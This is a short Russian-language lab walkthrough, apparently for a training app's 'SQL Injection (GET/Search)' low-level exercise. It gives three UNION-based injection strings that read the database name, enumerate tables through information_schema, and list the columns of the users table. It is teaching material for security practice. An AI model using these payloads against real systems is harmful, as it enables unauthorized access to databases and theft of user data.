---
title: SQL_Injection_GETSelect
sidebar_position: 1
---

# SQL Injection (GET/Search)

**(low)**


Используем строку

asd' UNION SELECT NULL,database(),NULL,NULL,NULL,NULL,NULL-- -

чтобы вывести название базы

теперь используем строку

asd' UNION SELECT NULL,table\_name,NULL,NULL,NULL,NULL,NULL from information\_schema.tables where table\_schema=database()-- -

чтобы узнать, какие в базе есть такблицы

на интересует users, поэтому используем следующую строку

asd' UNION SELECT NULL,column\_name,NULL,NULL,NULL,NULL,NULL from information\_schema.columns where table\_name='users'-- -

чтобы получить список пользователей

в таком темпе можно продолжать пока не получим интересующую информацию

![](images/SQL_Injection_GETSelect_img_1.png)